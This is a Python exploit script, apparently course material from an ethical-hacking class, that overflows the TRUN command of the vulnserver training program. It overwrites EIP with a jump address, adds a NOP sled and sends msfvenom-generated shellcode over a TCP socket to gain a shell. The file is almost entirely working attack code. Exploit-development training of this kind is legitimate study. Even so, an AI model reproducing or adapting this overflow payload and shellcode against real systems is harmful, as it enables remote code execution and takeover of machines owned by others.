#!/usr/bin/python
# for https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course
# not an original work

# Intro to Exploit Dev (Buffer Overflows), Generating Shellcode and Gaining Root
# sends a shell payload to TRUN method of vulnserver
# usage: ./shelloader.py <IPv4 address> <port #> <EIP offset>
import sys, socket

HOST = sys.argv[1] 
PORT = int(sys.argv[2])
OFFSET = int(sys.argv[3])
JMPPOINT =  '\xaf\x11\x50\x62'

jmpPayload = "A" * OFFSET + JMPPOINT

# add no-op padding
noOperation = "\x90" * 32

# msfvenom generated shellcode
shellcode = (
"\xbd\x93\x20\x95\xf9\xd9\xcc\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x68\x12\x83\xc0\x04\x03\xfb\x2e\x77\x0c\x07\xc6\xf5"
"\xef\xf7\x17\x9a\x66\x12\x26\x9a\x1d\x57\x19\x2a\x55\x35\x96"
"\xc1\x3b\xad\x2d\xa7\x93\xc2\x86\x02\xc2\xed\x17\x3e\x36\x6c"
"\x94\x3d\x6b\x4e\xa5\x8d\x7e\x8f\xe2\xf0\x73\xdd\xbb\x7f\x21"
"\xf1\xc8\xca\xfa\x7a\x82\xdb\x7a\x9f\x53\xdd\xab\x0e\xef\x84"
"\x6b\xb1\x3c\xbd\x25\xa9\x21\xf8\xfc\x42\x91\x76\xff\x82\xeb"
"\x77\xac\xeb\xc3\x85\xac\x2c\xe3\x75\xdb\x44\x17\x0b\xdc\x93"
"\x65\xd7\x69\x07\xcd\x9c\xca\xe3\xef\x71\x8c\x60\xe3\x3e\xda"
"\x2e\xe0\xc1\x0f\x45\x1c\x49\xae\x89\x94\x09\x95\x0d\xfc\xca"
"\xb4\x14\x58\xbc\xc9\x46\x03\x61\x6c\x0d\xae\x76\x1d\x4c\xa7"
"\xbb\x2c\x6e\x37\xd4\x27\x1d\x05\x7b\x9c\x89\x25\xf4\x3a\x4e"
"\x49\x2f\xfa\xc0\xb4\xd0\xfb\xc9\x72\x84\xab\x61\x52\xa5\x27"
"\x71\x5b\x70\xe7\x21\xf3\x2b\x48\x91\xb3\x9b\x20\xfb\x3b\xc3"
"\x51\x04\x96\x6c\xfb\xff\x71\x99\xfc\xfd\x8e\xf5\xfe\x01\x80"
"\x59\x76\xe7\xc8\x71\xde\xb0\x64\xeb\x7b\x4a\x14\xf4\x51\x37"
"\x16\x7e\x56\xc8\xd9\x77\x13\xda\x8e\x77\x6e\x80\x19\x87\x44"
"\xac\xc6\x1a\x03\x2c\x80\x06\x9c\x7b\xc5\xf9\xd5\xe9\xfb\xa0"
"\x4f\x0f\x06\x34\xb7\x8b\xdd\x85\x36\x12\x93\xb2\x1c\x04\x6d"
"\x3a\x19\x70\x21\x6d\xf7\x2e\x87\xc7\xb9\x98\x51\xbb\x13\x4c"
"\x27\xf7\xa3\x0a\x28\xd2\x55\xf2\x99\x8b\x23\x0d\x15\x5c\xa4"
"\x76\x4b\xfc\x4b\xad\xcf\x1c\xae\x67\x3a\xb5\x77\xe2\x87\xd8"
"\x87\xd9\xc4\xe4\x0b\xeb\xb4\x12\x13\x9e\xb1\x5f\x93\x73\xc8"
"\xf0\x76\x73\x7f\xf0\x52")

try:
    
    # call the method, overrun the buffer and modify the EIP, add padding, and add the shellcode
    payload = "TRUN /.:/" + jmpPayload + noOperation + shellcode
    
    # setup IPV4 TCP socket 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))

    # send payload ;)
    s.send((payload))
    s.close()

except:

    print ("error connecting to server")
    sys.exit()
